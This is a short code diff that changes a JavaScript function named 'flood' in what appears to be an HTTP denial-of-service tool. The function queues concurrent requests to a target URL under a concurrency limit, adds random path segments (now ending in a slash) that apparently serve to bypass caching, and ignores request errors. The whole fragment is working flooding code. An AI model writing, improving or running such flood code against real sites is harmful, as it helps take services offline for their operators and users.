@@ -134,7 +134,7 @@ async function flood(target) {
     if (queue.length > CONCURRENCY_LIMIT) {
       await queue.shift()
     }
-    rand = i % 10 === 0 ? '' : (Math.random().toString(36).replace(/[^a-z]+/g, '') + '/' + Math.random().toString(36).replace(/[^a-z]+/g, ''))
+    rand = i % 10 === 0 ? '' : (Math.random().toString(36).replace(/[^a-z]+/g, '') + '/' + Math.random().toString(36).replace(/[^a-z]+/g, '') + '/')
     queue.push(
       fetchWithTimeout(target+rand, { timeout: 3000 })
         .catch((error) => {
